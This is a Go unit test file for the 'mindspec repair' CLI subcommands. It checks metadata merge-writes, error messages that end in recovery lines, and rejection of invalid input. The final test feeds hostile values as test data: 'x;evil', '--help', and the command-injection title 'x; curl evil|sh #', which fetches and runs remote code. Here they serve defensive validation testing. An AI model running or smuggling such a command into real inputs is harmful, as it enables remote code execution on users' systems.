package main

// Spec 092 Bead 3 (Req 19): `mindspec repair phase <spec-id>` unit
// tests — re-derive from children, write via the bead.MergeMetadata
// seam (merge semantics; the preservation diff itself is pinned in
// internal/bead TestMergeMetadata_PreservesUnrelatedKeys), and emit
// guard-convention failures. The HasFinalRecoveryLine assertions are
// the per-site Req 21 mirror for this package (see
// internal/guard/recovery_convention_test.go).

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	"github.com/mrmaxsteel/mindspec/internal/bead"
	"github.com/mrmaxsteel/mindspec/internal/guard"
	"github.com/mrmaxsteel/mindspec/internal/phase"
)

// TestRepairMergeMetadataFnDefaultsToBeadMergeMetadata kills panel-R3
// mutant M4a-2: the production binding of the repair write seam MUST
// be bead.MergeMetadata (read-merge-write). A rebind to a raw replace
// path would silently wipe unrelated metadata keys — the exact failure
// `mindspec repair phase` exists to prevent (Req 19).
func TestRepairMergeMetadataFnDefaultsToBeadMergeMetadata(t *testing.T) {
	if reflect.ValueOf(repairMergeMetadataFn).Pointer() != reflect.ValueOf(bead.MergeMetadata).Pointer() {
		t.Fatal("repairMergeMetadataFn must default to bead.MergeMetadata (merge semantics, spec 092 Req 19)")
	}
}

// stubRepairPhaseEnv wires the phase package stubs with one epic
// ("epic-92") for spec "092-agent-contract-hardening" whose stored
// phase is `stored` and whose children are all closed (derived =
// review), and swaps the repair merge seam for `merge`.
func stubRepairPhaseEnv(t *testing.T, stored string, merge func(string, map[string]interface{}) error) {
	t.Helper()
	meta := map[string]interface{}{
		"spec_num":             float64(92),
		"spec_title":           "agent-contract-hardening",
		"mindspec_migrated_at": "2026-01-01T00:00:00Z",
	}
	if stored != "" {
		meta["mindspec_phase"] = stored
	}
	epics := []phase.EpicInfo{{
		ID: "epic-92", Title: "[SPEC 092-agent-contract-hardening] Hardening", Status: "open",
		IssueType: "epic", Metadata: meta,
	}}
	restoreList := phase.SetListJSONForTest(func(args ...string) ([]byte, error) {
		for _, a := range args {
			if a == "--type=epic" {
				return json.Marshal(epics)
			}
			if strings.HasPrefix(a, "--parent") {
				return json.Marshal([]phase.ChildInfo{{ID: "b1", Status: "closed", IssueType: "task"}})
			}
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreList)
	restoreRun := phase.SetRunBDForTest(func(args ...string) ([]byte, error) {
		if len(args) >= 2 && args[0] == "show" && args[1] == "epic-92" {
			return json.Marshal(epics)
		}
		return []byte("[]"), nil
	})
	t.Cleanup(restoreRun)

	origMerge := repairMergeMetadataFn
	repairMergeMetadataFn = merge
	t.Cleanup(func() { repairMergeMetadataFn = origMerge })
}

func TestRepairPhase_WritesDerivedViaMergeSeam(t *testing.T) {
	var gotID string
	var gotUpdates map[string]interface{}
	calls := 0
	stubRepairPhaseEnv(t, "implement", func(id string, updates map[string]interface{}) error {
		calls++
		gotID = id
		gotUpdates = updates
		return nil
	})

	if err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"}); err != nil {
		t.Fatalf("repair phase: %v", err)
	}
	if calls != 1 {
		t.Fatalf("merge seam calls = %d, want 1", calls)
	}
	if gotID != "epic-92" {
		t.Errorf("merge target = %q, want epic-92", gotID)
	}
	// Exactly the derived phase, nothing else: merge semantics mean
	// the update set carries ONLY the key being repaired.
	if len(gotUpdates) != 1 || gotUpdates["mindspec_phase"] != "review" {
		t.Errorf("merge updates = %v, want only mindspec_phase=review", gotUpdates)
	}
}

func TestRepairPhase_UnknownSpecFailsWithRecoveryLine(t *testing.T) {
	stubRepairPhaseEnv(t, "implement", func(id string, updates map[string]interface{}) error {
		t.Error("merge seam must not be called for an unknown spec")
		return nil
	})

	err := repairPhaseRunE(repairPhaseCmd, []string{"099-nope"})
	if err == nil {
		t.Fatal("expected error for unknown spec")
	}
	if !guard.HasFinalRecoveryLine(err.Error()) {
		t.Errorf("repair failure must end with a recovery line (Req 12/21): %v", err)
	}
	if strings.Contains(err.Error(), "bd update --metadata") {
		t.Errorf("emitted message contains banned raw metadata command (Req 19): %v", err)
	}
}

func TestRepairPhase_WriteFailureHasRecoveryLine(t *testing.T) {
	stubRepairPhaseEnv(t, "implement", func(id string, updates map[string]interface{}) error {
		return errMock
	})

	err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"})
	if err == nil {
		t.Fatal("expected error when the merge-write fails")
	}
	if !guard.HasFinalRecoveryLine(err.Error()) {
		t.Errorf("repair write failure must end with a recovery line: %v", err)
	}
	if !strings.Contains(err.Error(), "mindspec repair phase 092-agent-contract-hardening") {
		t.Errorf("recovery should be the re-runnable repair command: %v", err)
	}
	if strings.Contains(err.Error(), "bd update --metadata") {
		t.Errorf("emitted message contains banned raw metadata command (Req 19): %v", err)
	}
}

// TestRepairPhase_AlreadyConsistentStillMergeWrites covers the
// stored==derived re-run path (repair.go): the command still performs
// the merge-write (idempotent refresh) and succeeds.
func TestRepairPhase_AlreadyConsistentStillMergeWrites(t *testing.T) {
	calls := 0
	var gotUpdates map[string]interface{}
	stubRepairPhaseEnv(t, "review", func(id string, updates map[string]interface{}) error {
		calls++
		gotUpdates = updates
		return nil
	})

	if err := repairPhaseRunE(repairPhaseCmd, []string{"092-agent-contract-hardening"}); err != nil {
		t.Fatalf("already-consistent repair must succeed, got: %v", err)
	}
	if calls != 1 {
		t.Fatalf("merge seam calls = %d, want 1 (idempotent refresh)", calls)
	}
	if len(gotUpdates) != 1 || gotUpdates["mindspec_phase"] != "review" {
		t.Errorf("merge updates = %v, want only mindspec_phase=review", gotUpdates)
	}
}

// errMock is a sentinel error for the write-failure path.
var errMock = &mockErr{}

type mockErr struct{}

func (*mockErr) Error() string { return "dolt offline" }

// TestRepairSpecTitle is spec 120 AC-8 (R3 lever): `mindspec repair
// spec-title <epic-id> <title>` merge-writes spec_title via the
// repairMergeMetadataFn seam preserving unrelated metadata keys (HC-5);
// REFUSES an invalid <epic-id> argument before any bd invocation (round-3
// O3); refuses a replacement title whose slug fails the corrected
// idvalidate.SpecID; prints only escaped/validated values.
func TestRepairSpecTitle(t *testing.T) {
	stubGetMeta := func(t *testing.T, meta map[string]interface{}) {
		t.Helper()
		origGet := repairGetMetadataFn
		repairGetMetadataFn = func(id string) (map[string]interface{}, error) {
			return meta, nil
		}
		t.Cleanup(func() { repairGetMetadataFn = origGet })
	}

	t.Run("merge-writes preserving unrelated metadata keys", func(t *testing.T) {
		stubGetMeta(t, map[string]interface{}{
			"spec_num":             float64(120),
			"spec_title":           "old-hostile-title",
			"mindspec_phase":       "implement",
			"mindspec_migrated_at": "2026-01-01T00:00:00Z",
		})
		var gotID string
		var gotUpdates map[string]interface{}
		calls := 0
		origMerge := repairMergeMetadataFn
		repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
			calls++
			gotID = id
			gotUpdates = updates
			return nil
		}
		t.Cleanup(func() { repairMergeMetadataFn = origMerge })

		if err := repairSpecTitleRunE(repairSpecTitleCmd, []string{"mindspec-hostile-epic", "trust boundary render audit"}); err != nil {
			t.Fatalf("repair spec-title: %v", err)
		}
		if calls != 1 {
			t.Fatalf("merge seam calls = %d, want 1", calls)
		}
		if gotID != "mindspec-hostile-epic" {
			t.Errorf("merge target = %q, want mindspec-hostile-epic", gotID)
		}
		// Merge semantics: the update set carries ONLY spec_title — never
		// re-writing spec_num or any other key (HC-5, unrelated keys
		// preserved by the read-merge-write, not by this update map).
		if len(gotUpdates) != 1 || gotUpdates["spec_title"] != "trust boundary render audit" {
			t.Errorf("merge updates = %v, want only spec_title", gotUpdates)
		}
	})

	t.Run("refuses an invalid epic-id before any bd invocation", func(t *testing.T) {
		var getCalls, mergeCalls int
		origGet := repairGetMetadataFn
		repairGetMetadataFn = func(id string) (map[string]interface{}, error) {
			getCalls++
			return nil, nil
		}
		t.Cleanup(func() { repairGetMetadataFn = origGet })
		origMerge := repairMergeMetadataFn
		repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
			mergeCalls++
			return nil
		}
		t.Cleanup(func() { repairMergeMetadataFn = origMerge })

		for _, hostile := range []string{"--help", "x;evil"} {
			err := repairSpecTitleRunE(repairSpecTitleCmd, []string{hostile, "some title"})
			if err == nil {
				t.Errorf("repairSpecTitleRunE(%q, ...) accepted a hostile epic id", hostile)
			}
			if !guard.HasFinalRecoveryLine(err.Error()) {
				t.Errorf("refusal for %q must end with a recovery line: %v", hostile, err)
			}
		}
		if getCalls != 0 || mergeCalls != 0 {
			t.Errorf("expected ZERO bd invocations before the epic-id refusal, got get=%d merge=%d", getCalls, mergeCalls)
		}
	})

	t.Run("refuses a replacement title whose slug is invalid", func(t *testing.T) {
		stubGetMeta(t, map[string]interface{}{
			"spec_num":   float64(120),
			"spec_title": "clean-title",
		})
		var mergeCalls int
		origMerge := repairMergeMetadataFn
		repairMergeMetadataFn = func(id string, updates map[string]interface{}) error {
			mergeCalls++
			return nil
		}
		t.Cleanup(func() { repairMergeMetadataFn = origMerge })

		err := repairSpecTitleRunE(repairSpecTitleCmd, []string{"mindspec-hostile-epic", "x; curl evil|sh #"})
		if err == nil {
			t.Fatal("expected a refusal for a title whose slug fails idvalidate.SpecID")
		}
		if !guard.HasFinalRecoveryLine(err.Error()) {
			t.Errorf("refusal must end with a recovery line: %v", err)
		}
		if mergeCalls != 0 {
			t.Errorf("expected ZERO merge-write calls for an invalid replacement title, got %d", mergeCalls)
		}
		if strings.ContainsRune(err.Error(), 0x00) || strings.ContainsRune(err.Error(), 0x1b) {
			t.Errorf("refusal must not contain raw NUL/ESC bytes: %q", err.Error())
		}
	})
}
